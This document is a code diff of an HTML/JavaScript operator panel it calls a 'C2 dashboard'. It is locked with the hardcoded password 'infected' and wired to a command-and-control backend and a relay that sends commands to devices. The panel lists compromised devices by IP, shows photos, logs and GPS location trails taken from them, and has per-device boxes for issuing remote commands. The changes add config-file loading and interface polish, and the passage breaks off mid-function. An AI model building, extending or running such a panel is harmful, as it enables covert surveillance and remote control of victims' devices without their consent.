@@ -7,7 +7,7 @@
     <!-- Leaflet CSS -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        /* --- Same styles as before (kept unchanged) --- */
+        /* --- SAME STYLES AS BEFORE (kept unchanged) --- */
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;background-image:radial-gradient(ellipse at 50% 0%,#1a1a2e 0%,#0a0a12 70%)}
         .login-container{display:none;justify-content:center;align-items:center;min-height:100vh;width:100%;position:fixed;top:0;left:0;background:rgba(10,10,18,0.95);backdrop-filter:blur(20px);z-index:9999;padding:20px}
@@ -37,9 +37,10 @@
         .dashboard-header .settings-btn{background:rgba(42,42,68,0.4);border:1px solid rgba(42,42,68,0.3);border-radius:50%;width:36px;height:36px;display:flex;align-items:center;justify-content:center;font-size:18px;cursor:pointer;transition:all 0.2s;backdrop-filter:blur(10px)}
         .dashboard-header .settings-btn:hover{background:rgba(58,58,90,0.8);border-color:#f7971e}
         .controls{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:24px;align-items:center;padding:12px 20px;background:rgba(20,20,31,0.3);backdrop-filter:blur(10px);border-radius:16px;border:1px solid rgba(42,42,68,0.2)}
-        .controls .refresh-btn{background:linear-gradient(135deg,#2a2a44,#3a3a5a);border:none;padding:10px 28px;border-radius:60px;color:#e0e0e0;font-weight:600;font-size:14px;cursor:pointer;transition:all 0.2s;border:1px solid rgba(42,42,68,0.3)}
-        .controls .refresh-btn:hover{background:linear-gradient(135deg,#3a3a5a,#4a4a6a);border-color:#f7971e;transform:translateY(-1px)}
-        .controls .refresh-btn:active{transform:scale(0.96)}
+        .controls .refresh-btn{background:linear-gradient(135deg,#2a2a44,#3a3a5a);border:none;padding:10px 28px;border-radius:60px;color:#e0e0e0;font-weight:600;font-size:14px;cursor:pointer;transition:all 0.2s;border:1px solid rgba(42,42,68,0.3);position:relative}
+        .controls .refresh-btn:disabled{opacity:0.6;cursor:not-allowed}
+        .controls .refresh-btn .spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
+        @keyframes spin{to{transform:rotate(360deg)}}
         .controls .info-text{color:#4a6a7a;font-size:13px}
         .controls label{display:flex;align-items:center;gap:6px;color:#4a6a7a;font-size:13px;cursor:pointer}
         .controls label input{accent-color:#f7971e;width:16px;height:16px;cursor:pointer}
@@ -48,6 +49,7 @@
         .stats-bar{display:flex;gap:24px;flex-wrap:wrap;background:rgba(20,20,31,0.4);backdrop-filter:blur(20px);padding:16px 28px;border-radius:20px;border:1px solid rgba(42,42,68,0.3);margin-bottom:28px}
         .stats-bar .stat{font-size:14px;color:#8a8aaa;display:flex;align-items:center;gap:8px}
         .stats-bar .stat .num{color:#f7971e;font-weight:700;font-size:22px;min-width:30px}
+        .stats-bar .stat .last-updated{font-size:11px;color:#4a6a7a;margin-left:12px}
         .device-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:24px}
         .device-card{background:rgba(20,20,31,0.5);backdrop-filter:blur(20px);border-radius:20px;padding:22px;border:1px solid rgba(42,42,68,0.3);transition:all 0.3s ease;box-shadow:0 8px 32px rgba(0,0,0,0.2)}
         .device-card:hover{border-color:rgba(247,151,30,0.3);transform:translateY(-4px);box-shadow:0 16px 48px rgba(0,0,0,0.4)}
@@ -96,7 +98,12 @@
         details summary{color:#88ccff;font-size:12px;cursor:pointer;font-weight:500}
         details summary:hover{color:#f7971e}
         .error-box{background:rgba(42,26,26,0.6);backdrop-filter:blur(10px);border:1px solid rgba(255,94,94,0.3);border-radius:16px;padding:20px;color:#ff5e5e;grid-column:1/-1;text-align:center}
-        .loading{color:#88ccff;font-size:16px;text-align:center;padding:60px 0;grid-column:1/-1}
+        .loading-overlay{display:none;position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.3);border-radius:20px;backdrop-filter:blur(2px);align-items:center;justify-content:center;z-index:10}
+        .loading-overlay.show{display:flex}
+        .loading-overlay .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite}
+        .device-card{position:relative}
+        .hidden-extra{display:none}
+        .show-all-btn{cursor:pointer}
         .modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);backdrop-filter:blur(8px);z-index:10000;justify-content:center;align-items:center;padding:20px}
         .modal-overlay.open{display:flex}
         .modal-card{background:rgba(20,20,31,0.95);border-radius:28px;padding:36px 32px;max-width:600px;width:100%;border:1px solid rgba(42,42,68,0.6);box-shadow:0 40px 80px rgba(0,0,0,0.9);max-height:80vh;overflow-y:auto}
@@ -106,12 +113,6 @@
         .modal-card .history-item{border-bottom:1px solid #1a1a2e;padding:8px 0;font-size:13px}
         .modal-card .history-item .cmd{color:#88ccff;font-weight:600}
         .modal-card .history-item .out{color:#6fcf97;white-space:pre-wrap;font-family:'Courier New',monospace;font-size:12px;margin-top:4px;background:#0b0b14;padding:4px 8px;border-radius:8px}
-        .hidden-extra{display:none}
-        .show-all-btn{cursor:pointer}
-        ::-webkit-scrollbar{width:4px}
-        ::-webkit-scrollbar-track{background:rgba(10,10,18,0.5)}
-        ::-webkit-scrollbar-thumb{background:rgba(42,42,68,0.6);border-radius:10px}
-        ::-webkit-scrollbar-thumb:hover{background:rgba(58,58,90,0.8)}
         @media(max-width:600px){.login-card{padding:32px 24px}.device-grid{grid-template-columns:1fr}.stats-bar{gap:12px;padding:14px 16px;flex-wrap:wrap}.dashboard-header{padding:12px 16px}.dashboard-header h1{font-size:20px}.controls{padding:10px 14px}.device-card{padding:16px}.photo-grid img{width:60px;height:60px}}
     </style>
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -122,11 +123,11 @@
         <div class="login-card">
             <span class="lock-icon">🔒</span>
             <h1>Admin Access</h1>
-            <p class="sub">Enter password to view dashboard.</p>
+            <p class="sub">Enter the password to view the C2 dashboard.</p>
             <input type="password" id="passwordInput" placeholder="Enter password" autofocus />
-            <button class="btn" id="loginBtn">Unlock</button>
+            <button class="btn" id="loginBtn">Unlock Dashboard</button>
             <div class="error-msg" id="loginError"></div>
-            <p class="footer-text">🔐 Password protected</p>
+            <p class="footer-text">🔐 This dashboard is password protected.</p>
         </div>
     </div>
 
@@ -145,7 +146,7 @@
             <button class="refresh-btn" id="refreshBtn"><span class="icon">🔄</span> Refresh</button>
             <label><input type="checkbox" id="autoRefreshToggle"> Auto-Refresh (5s)</label>
             <button class="export-btn" id="exportCsvBtn">📥 Export CSV</button>
-            <span class="info-text">Fast load – click "Show All" per card</span>
+            <span class="info-text" id="lastUpdatedLabel">Last updated: never</span>
         </div>
 
         <div class="stats-bar" id="statsBar">
@@ -156,7 +157,7 @@
         </div>
 
         <div class="device-grid" id="deviceGrid">
-            <div class="loading">⏳ Loading devices...</div>
+            <!-- Cards will be rendered here -->
         </div>
     </div>
 
@@ -165,11 +166,19 @@
         <div class="modal-card">
             <button class="close-modal" id="closeSettingsBtn">✕</button>
             <h2>⚙️ Settings</h2>
+            <p style="color:#4a6a7a;font-size:12px;margin-bottom:12px;">
+                📄 Values are loaded from <code>config.json</code> (permanent).<br>
+                Changes here are saved to your browser's <code>localStorage</code> but will be overridden by the config file on next load.
+            </p>
             <label style="display:block;font-size:13px;color:#8a8aaa;margin-top:14px;margin-bottom:4px;">Backend URL</label>
             <input type="text" id="backendInput" style="width:100%;padding:12px 16px;border-radius:30px;border:1px solid rgba(42,42,68,0.4);background:rgba(11,11,20,0.6);color:#e0e0e0;font-size:14px;outline:none;" />
             <label style="display:block;font-size:13px;color:#8a8aaa;margin-top:14px;margin-bottom:4px;">Relay API URL</label>
             <input type="text" id="relayInput" style="width:100%;padding:12px 16px;border-radius:30px;border:1px solid rgba(42,42,68,0.4);background:rgba(11,11,20,0.6);color:#e0e0e0;font-size:14px;outline:none;" />
-            <button class="btn-save" id="saveSettingsBtn" style="margin-top:20px;width:100%;padding:12px;background:linear-gradient(135deg,#f7971e,#ffd200);border:none;border-radius:60px;font-weight:700;font-size:16px;color:#0a0a12;cursor:pointer;">💾 Save Settings</button>
+            <div style="display:flex;gap:10px;margin-top:16px;flex-wrap:wrap;">
+                <button class="btn-save" id="saveSettingsBtn" style="flex:1;padding:12px;background:linear-gradient(135deg,#f7971e,#ffd200);border:none;border-radius:60px;font-weight:700;font-size:16px;color:#0a0a12;cursor:pointer;">💾 Save to localStorage</button>
+                <button class="btn-save" id="resetSettingsBtn" style="flex:1;padding:12px;background:#2a2a44;border:none;border-radius:60px;font-weight:600;font-size:14px;color:#e0e0e0;cursor:pointer;">↻ Reload from config.json</button>
+            </div>
+            <div id="settingsStatus" style="margin-top:10px;font-size:12px;color:#4a6a7a;text-align:center;"></div>
         </div>
     </div>
 
@@ -184,13 +193,53 @@
 
     <script>
         // ============================================================
-        //  CONFIG & DOM REFS
+        //  CONFIG — DEFAULTS (fallback if everything else fails)
         // ============================================================
-        const PASSWORD = 'infected';
-        const DEFAULTS = { backend: 'https://c2-vercel-backend.vercel.app', relay: 'https://relay-server-35gk.onrender.com/send-command' };
-        function getConfig(key) { return localStorage.getItem(key) || DEFAULTS[key]; }
-        function setConfig(key, val) { localStorage.setItem(key, val); }
+        const DEFAULTS = {
+            backend: 'https://c2-vercel-backend.vercel.app',
+            relay: 'https://relay-server-35gk.onrender.com/send-command'
+        };
 
+        // ============================================================
+        //  LOAD CONFIG FROM JSON FILE
+        // ============================================================
+        let configLoaded = false;
+        let configData = {};
+
+        async function loadConfigFile() {
+            try {
+                const resp = await fetch('./config.json');
+                if (!resp.ok) throw new Error('Config file not found');
+                const data = await resp.json();
+                configData = data;
+                configLoaded = true;
+                console.log('[Config] Loaded from config.json:', configData);
+            } catch (e) {
+                console.warn('[Config] Could not load config.json, using fallback.', e.message);
+                configLoaded = false;
+            }
+        }
+
+        // ============================================================
+        //  GET CONFIG VALUE (priority: config.json > localStorage > DEFAULTS)
+        // ============================================================
+        function getConfigValue(key) {
+            if (configLoaded && configData[key] !== undefined && configData[key] !== '') {
+                return configData[key];
+            }
+            const stored = localStorage.getItem(key);
+            if (stored !== null && stored !== '') {
+                return stored;
+            }
+            return DEFAULTS[key] || '';
+        }
+
+        function getBackend() { return getConfigValue('backend_url'); }
+        function getRelay() { return getConfigValue('relay_api'); }
+
+        // ============================================================
+        //  DOM REFS
+        // ============================================================
         const loginContainer = document.getElementById('loginContainer');
         const dashboardContainer = document.getElementById('dashboardContainer');
         const passwordInput = document.getElementById('passwordInput');
@@ -211,9 +260,12 @@
         const backendInput = document.getElementById('backendInput');
         const relayInput = document.getElementById('relayInput');
         const saveSettingsBtn = document.getElementById('saveSettingsBtn');
+        const resetSettingsBtn = document.getElementById('resetSettingsBtn');
+        const settingsStatus = document.getElementById('settingsStatus');
         const historyModal = document.getElementById('historyModal');
         const closeHistoryBtn = document.getElementById('closeHistoryBtn');
         const historyContent = document.getElementById('historyContent');
+        const lastUpdatedLabel = document.getElementById('lastUpdatedLabel');
 
         let isLoading = false;
         let refreshInterval = null;
@@ -235,7 +287,7 @@
         }
         function login() {
             const pass = passwordInput.value.trim();
-            if (pass === PASSWORD) {
+            if (pass === 'infected') {
                 localStorage.setItem('dashboard_auth','true');
                 loginError.textContent='';
                 passwordInput.value='';
@@ -261,32 +313,43 @@
         logoutBtn.addEventListener('click', logout);
 
         // ============================================================
-        //  SETTINGS
+        //  SETTINGS MODAL
         // ============================================================
         function openSettings() {
-            backendInput.value = getConfig('backend_url');
-            relayInput.value = getConfig('relay_api');
+            backendInput.value = getBackend();
+            relayInput.value = getRelay();
+            const source = configLoaded ? 'config.json' : (localStorage.getItem('backend_url') ? 'localStorage' : 'defaults');
+            settingsStatus.textContent = `📄 Loaded from: ${source}`;
             settingsModal.classList.add('open');
         }
         function closeSettings() { settingsModal.classList.remove('open'); }
         function saveSettings() {
             const b = backendInput.value.trim();
             const r = relayInput.value.trim();
-            if (b) setConfig('backend_url', b);
-            if (r) setConfig('relay_api', r);
+            if (b) localStorage.setItem('backend_url', b);
+            if (r) localStorage.setItem('relay_api', r);
+            settingsStatus.textContent = '✅ Saved to localStorage (will be used if config.json is missing)';
             closeSettings();
             loadDevices();
+        }
+        function reloadFromConfig() {
+            loadConfigFile().then(() => {
+                backendInput.value = getBackend();
+                relayInput.value = getRelay();
+                settingsStatus.textContent = '↻ Reloaded from config.json';
+            });
         }
         settingsBtn.addEventListener('click', openSettings);
         closeSettingsBtn.addEventListener('click', closeSettings);
         saveSettingsBtn.addEventListener('click', saveSettings);
+        resetSettingsBtn.addEventListener('click', reloadFromConfig);
         settingsModal.addEventListener('click', function(e) { if (e.target === this) closeSettings(); });
 
         // ============================================================
         //  EXPORT CSV
         // ============================================================
         async function exportCsv() {
-            const backend = getConfig('backend_url');
+            const backend = getBackend();
             const devices = await fetchJSON(`${backend}/api/devices`);
             if (!devices) return;
             const groups = groupByIp(devices);
@@ -317,8 +380,6 @@
         // ============================================================
         //  API HELPERS
         // ============================================================
-        function getBackend() { return getConfig('backend_url'); }
-        function getRelay() { return getConfig('relay_api'); }
         async function fetchJSON(url) {
             try {
                 const r = await fetch(url);
@@ -438,297 +499,298 @@
         }
 
         // ============================================================
-        //  TOGGLE EXTRA DATA FOR A CARD
+        //  TOGGLE EXTRA DATA
         // ============================================================
         function toggleExtra(repId) {
-            const extraDiv = document.getElementById(`extra_${repId}`);
+            const photoLimited = document.getElementById(`photo_limited_${repId}`);
+            const photoFull = document.getElementById(`photo_full_${repId}`);
+            const logLimited = document.getElementById(`log_limited_${repId}`);
+            const logFull = document.getElementById(`log_full_${repId}`);
+            const locLimited = document.getElementById(`loc_limited_${repId}`);
+            const locFull = document.getElementById(`loc_full_${repId}`);
             const btn = document.getElementById(`toggle_btn_${repId}`);
-            if (!extraDiv || !btn) return;
-            if (extraDiv.style.display === 'none') {
-                extraDiv.style.display = 'block';
+            if (!btn) return;
+            const hidden = photoFull.style.display === 'none' || photoFull.style.display === '';
+            if (hidden) {
+                photoLimited.style.display = 'none';
+                photoFull.style.display = 'flex';
+                logLimited.style.display = 'none';
+                logFull.style.display = 'block';
+                locLimited.style.display = 'none';
+                locFull.style.display = 'block';
                 btn.textContent = '📂 Hide Extra';
             } else {
-                extraDiv.style.display = 'none';
+                photoLimited.style.display = 'flex';
+                photoFull.style.display = 'none';
+                logLimited.style.display = 'block';
+                logFull.style.display = 'none';
+                locLimited.style.display = 'block';
+                locFull.style.display = 'none';
                 btn.textContent = '📂 Show All Data';
             }
         }
 
         // ============================================================
-        //  LOAD DEVICES – FAST WITH "SHOW ALL" BUTTON
+        //  UPDATE LAST UPDATED TIMESTAMP
+        // ============================================================
+        function updateLastUpdated() {
+            const now = new Date();
+            lastUpdatedLabel.textContent = `Last updated: ${now.toLocaleString()}`;
+        }
+
+        // ============================================================
+        //  LOAD DEVICES — SMOOTH (no flash)
         // ============================================================
         async function loadDevices() {
             if (isLoading) return;
             isLoading = true;
-            refreshBtn.textContent = '⏳ Loading...';
             refreshBtn.disabled = true;
-            deviceGrid.innerHTML = '<div class="loading">⏳ Loading devices...</div>';
+            refreshBtn.innerHTML = '<span class="spinner"></span> Loading...';
 
             const backend = getBackend();
-            const devices = await fetchJSON(`${backend}/api/devices`);
-            if (!devices || devices.length === 0) {
-                deviceGrid.innerHTML = `<div class="error-box">⚠️ No devices registered yet.</div>`;
-                statDevices.textContent='0'; statPhotos.textContent='0'; statLocations.textContent='0'; statLogs.textContent='0';
-                isLoading = false; refreshBtn.textContent='🔄 Refresh'; refreshBtn.disabled=false;
-                return;
-            }
-
-            // Group by IP
-            const groups = groupByIp(devices);
-            const groupKeys = Object.keys(groups);
-            statDevices.textContent = groupKeys.length;
-
-            // Collect all device IDs for parallel fetching
-            const allIds = [];
-            for (const ip of groupKeys) {
-                const ids = groups[ip].map(d => d.id);
-                allIds.push({ ip, ids });
-            }
-
-            // Fetch details for all devices in parallel
-            const detailPromises = [];
-            for (const item of allIds) {
-                for (const id of item.ids) {
-                    detailPromises.push(
-                        fetchJSON(`${backend}/api/device-details?deviceId=${encodeURIComponent(id)}`)
-                            .then(data => ({ id, data, ip: item.ip }))
-                    );
-                }
-            }
-
-            const allDetails = await Promise.all(detailPromises);
-            // Group details by IP
-            const detailsByIp = {};
-            for (const result of allDetails) {
-                if (!detailsByIp[result.ip]) detailsByIp[result.ip] = [];
-                if (result.data) detailsByIp[result.ip].push(result.data);
-            }
-
-            let totalPhotos = 0, totalLogs = 0, totalLocations = 0;
-            deviceGrid.innerHTML = '';
-
-            for (const ip of groupKeys) {
-                const deviceList = groups[ip];
-                const latest = deviceList.reduce((a,b) => a.last_seen > b.last_seen ? a : b);
-                const detailsList = detailsByIp[ip] || [];
-
-                // Merge all details
-                let allPhotos = [], allLogs = [], allLocations = [], allFiles = [], allCommands = [], allResults = [];
-                for (const d of detailsList) {
-                    allPhotos = allPhotos.concat(d.photos || []);
-                    allLogs = allLogs.concat(d.logs || []);
-                    allLocations = allLocations.concat(d.locations || []);
-                    allFiles = allFiles.concat(d.files || []);
-                    allCommands = allCommands.concat(d.commands || []);
-                    allResults = allResults.concat(d.results || []);
-                }
-                // Sort and limit for display
-                allPhotos.sort((a,b) => b.timestamp - a.timestamp);
-                allLogs.sort((a,b) => b.timestamp - a.timestamp);
-                allLocations.sort((a,b) => b.timestamp - a.timestamp);
-                const pc = allPhotos.length, lc = allLogs.length, locc = allLocations.length;
-                totalPhotos += pc; totalLogs += lc; totalLocations += locc;
-
-                const status = getGroupStatus(deviceList);
-                const statusClass = status === 'online' ? 'status-online' : 'status-offline';
-                const statusDot = status === 'online' ? 'online' : 'offline';
-                const statusLabel = status === 'online' ? 'Online' : 'Offline';
-
-                // Map
-                let mapHtml = '';
-                if (locc > 0) {
-                    const lastLoc = allLocations[0];
-                    mapHtml = `<div class="map-container" id="map_${ip}"></div>`;
+            try {
+                // 1. Fetch devices
+                const devices = await fetchJSON(`${backend}/api/devices`);
+                if (!devices) {
+                    // If fetch fails, show error but keep existing cards
+                    deviceGrid.innerHTML = `<div class="error-box">❌ Failed to load devices. Check your backend URL.</div>`;
+                    isLoading = false;
+                    refreshBtn.disabled = false;
+                    refreshBtn.innerHTML = '<span class="icon">🔄</span> Refresh';
+                    return;
                 }
 
-                // ---- Build Limited and Full Content ----
-                // Photos – Limited (6) and Full
-                let photoLimited = '';
-                let photoFull = '';
-                if (pc === 0) {
-                    photoLimited = '<span class="no-data">No photos</span>';
-                    photoFull = '<span class="no-data">No photos</span>';
-                } else {
-                    const first6 = allPhotos.slice(0, 6);
-                    photoLimited = first6.map(p => {
-                        let url = p.publicUrl || p.file_path || (p.data_url && p.data_url.startsWith('data:') ? p.data_url : '');
-                        return url ? `<img src="${url}" alt="photo" onclick="window.open('${url}')" loading="lazy" />` : '';
-                    }).join('');
-                    if (pc > 6) photoLimited += `<span style="color:#4a6a7a;font-size:11px;">+${pc-6} more</span>`;
-                    photoFull = allPhotos.map(p => {
-                        let url = p.publicUrl || p.file_path || (p.data_url && p.data_url.startsWith('data:') ? p.data_url : '');
-                        return url ? `<img src="${url}" alt="photo" onclick="window.open('${url}')" loading="lazy" />` : '';
-                    }).join('');
+                // 2. If no devices, show empty state
+                if (devices.length === 0) {
+                    deviceGrid.innerHTML = `<div class="error-box">⚠️ No devices registered yet.</div>`;
+                    statDevices.textContent='0'; statPhotos.textContent='0'; statLocations.textContent='0'; statLogs.textContent='0';
+                    isLoading = false;
+                    refreshBtn.disabled = false;
+                    refreshBtn.innerHTML = '<span class="icon">🔄</span> Refresh';
+                    updateLastUpdated();
+                    return;
                 }
 
-                // Logs – Limited (6) and Full
-                let logLimited = '', logFull = '';
-                if (lc === 0) {
-                    logLimited = '<span style="color:#4a6a7a;">No logs</span>';
-                    logFull = '<span style="color:#4a6a7a;">No logs</span>';
-                } else {
-                    const first6Logs = allLogs.slice(0, 6);
-                    logLimited = first6Logs.map(l =>
-                        `<div class="log-entry"><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span><span class="lvl-${l.level||'info'}">${l.message||''}</span></div>`
-                    ).join('');
-                    if (lc > 6) logLimited += `<div style="color:#4a6a7a;font-size:10px;">+${lc-6} more</div>`;
-                    logFull = allLogs.map(l =>
-                        `<div class="log-entry"><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span><span class="lvl-${l.level||'info'}">${l.message||''}</span></div>`
-                    ).join('');
+                // 3. Group by IP
+                const groups = groupByIp(devices);
+                const groupKeys = Object.keys(groups);
+                statDevices.textContent = groupKeys.length;
+
+                // 4. Fetch details for all devices in parallel
+                const allIds = [];
+                for (const ip of groupKeys) {
+                    const ids = groups[ip].map(d => d.id);
+                    allIds.push({ ip, ids });
                 }
 
-                // Locations – Limited (4) and Full
-                let locLimited = '', locFull = '';
-                if (locc === 0) {
-                    locLimited = '<span style="color:#4a6a7a;font-size:11px;">No locations</span>';
-                    locFull = '<span style="color:#4a6a7a;font-size:11px;">No locations</span>';
-                } else {
-                    const first4Locs = allLocations.slice(0, 4);
-                    locLimited = first4Locs.map(l =>
-                        `<div class="loc-entry"><span class="coords">📍 ${l.lat}, ${l.lon}</span><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span></div>`
-                    ).join('');
-                    if (locc > 4) locLimited += `<span style="color:#4a6a7a;font-size:10px;">+${locc-4} more</span>`;
-                    locFull = allLocations.map(l =>
-                        `<div class="loc-entry"><span class="coords">📍 ${l.lat}, ${l.lon}</span><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span></div>`
-                    ).join('');
-                }
-
-                const repId = latest.id;
-
-                // Determine if there is extra data to show
-                const hasExtra = (pc > 6) || (lc > 6) || (locc > 4);
-
-                // Build card
-                const card = document.createElement('div');
-                card.className = 'device-card';
-                card.innerHTML = `
-                    <div style="display:flex;justify-content:space-between;align-items:center;">
-                        <div class="device-ip">${ip}</div>
-                        <span class="status-indicator ${statusClass}"><span class="status-dot ${statusDot}"></span> ${statusLabel}</span>
-                    </div>
-                    <div class="device-meta">
-                        <div><span class="label">Platform:</span> ${latest.platform || 'Unknown'}</div>
-                        <div><span class="label">Screen:</span> ${latest.screen || 'Unknown'}</div>
-                        <div><span class="label">Devices:</span> ${deviceList.length} (IDs: ${deviceList.map(d=>d.id).join(', ')})</div>
-                        <div><span class="label">Last seen:</span> <span class="highlight">${new Date(latest.last_seen).toLocaleString()}</span></div>
-                        <div class="row" style="margin-top:6px;padding-top:6px;border-top:1px solid rgba(42,42,68,0.2);">
-                            <span><span class="label">📸 Photos:</span> ${pc}</span>
-                            <span><span class="label">📋 Logs:</span> ${lc}</span>
-                            <span><span class="label">📍 Locations:</span> ${locc}</span>
-                        </div>
-                    </div>
-
-                    <div class="notes-area">
-                        <input type="text" id="notes_input_${repId}" placeholder="Add note..." value="${latest.notes || ''}" />
-                        <button onclick="updateNotes('${repId}')">💾</button>
-                    </div>
-
-                    <div class="command-section">
-                        <input type="text" id="cmd_input_${repId}" placeholder="Enter command..." />
-                        <button class="btn btn-primary" onclick="sendCommand('${repId}')">📤 Send</button>
-                    </div>
-                    <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
-                        <button class="btn" onclick="showHistory('${repId}')">📜 History</button>
-                        <button class="btn" onclick="window.open('/api/photos?deviceId=${repId}')">📸 Photos</button>
-                        <button class="btn btn-danger" onclick="deleteDevice('${repId}')">🗑️ Remove</button>
-                        ${hasExtra ? `<button class="btn show-all-btn" id="toggle_btn_${repId}" onclick="toggleExtra('${repId}')">📂 Show All Data</button>` : ''}
-                    </div>
-
-                    <div class="section-title">📸 Photos <span class="count">${pc}</span></div>
-                    <div class="photo-grid" id="photo_limited_${repId}">${photoLimited}</div>
-                    <div class="photo-grid hidden-extra" id="photo_full_${repId}">${photoFull}</div>
-
-                    <div class="section-title">📋 Logs <span class="count">${lc}</span></div>
-                    <div class="log-area" id="log_limited_${repId}">${logLimited}</div>
-                    <div class="log-area hidden-extra" id="log_full_${repId}">${logFull}</div>
-
-                    <div class="section-title">📍 Locations <span class="count">${locc}</span></div>
-                    <div class="loc-list" id="loc_limited_${repId}">${locLimited}</div>
-                    <div class="loc-list hidden-extra" id="loc_full_${repId}">${locFull}</div>
-
-                    ${mapHtml}
-                `;
-                deviceGrid.appendChild(card);
-
-                // Wrap all extra sections in a single hidden container and hide them initially
-                // We already have separate hidden-extra divs, we'll also keep a toggle that shows/hides all.
-                // For simplicity, we'll use a wrapper approach: we already have separate divs with class hidden-extra,
-                // and we'll toggle their display using the button. We'll use the button to toggle a class on the container.
-                // But we have separate divs; we'll just toggle the hidden-extra class on those.
-                // We'll add a data attribute to group them.
-                // Since we have separate IDs, we can toggle them individually.
-                // We'll create a function that toggles all hidden-extra children of the card.
-                // But we already have a toggleExtra function that we'll modify to toggle all hidden-extra elements in the card.
-                // To keep it simple, we'll just toggle the hidden-extra class on the specific divs.
-                // We'll update the toggleExtra function to target the card.
-                // We'll pass the repId and toggle all hidden-extra inside the card.
-                // We'll also change button text.
-                // Let's adapt: we'll set the button's onclick to toggle the hidden-extra class on the specific divs.
-                // Since we have separate divs, we can toggle them by ID.
-
-                // Override the toggleExtra function to handle multiple divs.
-                // We'll redefine it globally.
-                window.toggleExtra = function(repId) {
-                    const photoLimited = document.getElementById(`photo_limited_${repId}`);
-                    const photoFull = document.getElementById(`photo_full_${repId}`);
-                    const logLimited = document.getElementById(`log_limited_${repId}`);
-                    const logFull = document.getElementById(`log_full_${repId}`);
-                    const locLimited = document.getElementById(`loc_limited_${repId}`);
-                    const locFull = document.getElementById(`loc_full_${repId}`);
-                    const btn = document.getElementById(`toggle_btn_${repId}`);
-                    if (!btn) return;
-                    const hidden = photoFull.style.display === 'none' || photoFull.style.display === '';
-                    if (hidden) {
-                        // Show full, hide limited
-                        photoLimited.style.display = 'none';
-                        photoFull.style.display = 'flex';
-                        logLimited.style.display = 'none';
-                        logFull.style.display = 'block';
-                        locLimited.style.display = 'none';
-                        locFull.style.display = 'block';
-                        btn.textContent = '📂 Hide Extra';
-                    } else {
-                        // Show limited, hide full
-                        photoLimited.style.display = 'flex';
-                        photoFull.style.display = 'none';
-                        logLimited.style.display = 'block';
-                        logFull.style.display = 'none';
-                        locLimited.style.display = 'block';
-                        locFull.style.display = 'none';
-                        btn.textContent = '📂 Show All Data';
+                const detailPromises = [];
+                for (const item of allIds) {
+                    for (const id of item.ids) {
+                        detailPromises.push(
+                            fetchJSON(`${backend}/api/device-details?deviceId=${encodeURIComponent(id)}`)
+                                .then(data => ({ id, data, ip: item.ip }))
+                        );
                     }
-                };
+                }
 
-                // Also we need to call it for each card to ensure the toggle state is set correctly.
-                // We'll set the initial state: limited visible, full hidden.
-                // Already set by CSS hidden-extra class.
-                // The button's onclick will toggle.
+                const allDetails = await Promise.all(detailPromises);
+                const detailsByIp = {};
+                for (const result of allDetails) {
+                    if (!detailsByIp[result.ip]) detailsByIp[result.ip] = [];
+                    if (result.data) detailsByIp[result.ip].push(result.data);
+                }
 
-                // For maps, we use lazy loading as before.
-                if (locc > 0 && document.getElementById(`map_${ip}`)) {
-                    const mapContainer = document.getElementById(`map_${ip}`);
-                    const observer = new IntersectionObserver((entries) => {
-                        entries.forEach(entry => {
-                            if (entry.isIntersecting && !mapContainer._leaflet) {
-                                const lastLoc = allLocations[0];
-                                const map = L.map(mapContainer).setView([lastLoc.lat, lastLoc.lon], 13);
-                                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
-                                L.marker([lastLoc.lat, lastLoc.lon]).addTo(map).bindPopup(`IP: ${ip}<br>Last: ${new Date(lastLoc.timestamp).toLocaleString()}`);
-                                mapContainer._leaflet = map;
-                                observer.disconnect();
-                            }
-                        });
-                    }, { threshold: 0.1 });
-                    observer.observe(mapContainer);
+                let totalPhotos = 0, totalLogs = 0, totalLocations = 0;
+                const fragment = document.createDocumentFragment();
+
+                // 5. Build new cards in memory
+                for (const ip of groupKeys) {
+                    const deviceList = groups[ip];
+                    const latest = deviceList.reduce((a,b) => a.last_seen > b.last_seen ? a : b);
+                    const detailsList = detailsByIp[ip] || [];
+
+                    let allPhotos = [], allLogs = [], allLocations = [], allFiles = [], allCommands = [], allResults = [];
+                    for (const d of detailsList) {
+                        allPhotos = allPhotos.concat(d.photos || []);
+                        allLogs = allLogs.concat(d.logs || []);
+                        allLocations = allLocations.concat(d.locations || []);
+                        allFiles = allFiles.concat(d.files || []);
+                        allCommands = allCommands.concat(d.commands || []);
+                        allResults = allResults.concat(d.results || []);
+                    }
+                    allPhotos.sort((a,b) => b.timestamp - a.timestamp);
+                    allLogs.sort((a,b) => b.timestamp - a.timestamp);
+                    allLocations.sort((a,b) => b.timestamp - a.timestamp);
+                    const pc = allPhotos.length, lc = allLogs.length, locc = allLocations.length;
+                    totalPhotos += pc; totalLogs += lc; totalLocations += locc;
+
+                    const status = getGroupStatus(deviceList);
+                    const statusClass = status === 'online' ? 'status-online' : 'status-offline';
+                    const statusDot = status === 'online' ? 'online' : 'offline';
+                    const statusLabel = status === 'online' ? 'Online' : 'Offline';
+
+                    // Map
+                    let mapHtml = '';
+                    if (locc > 0) {
+                        const lastLoc = allLocations[0];
+                        mapHtml = `<div class="map-container" id="map_${ip}"></div>`;
+                    }
+
+                    // Photos Limited/Full
+                    let photoLimited = '', photoFull = '';
+                    if (pc === 0) {
+                        photoLimited = '<span class="no-data">No photos</span>';
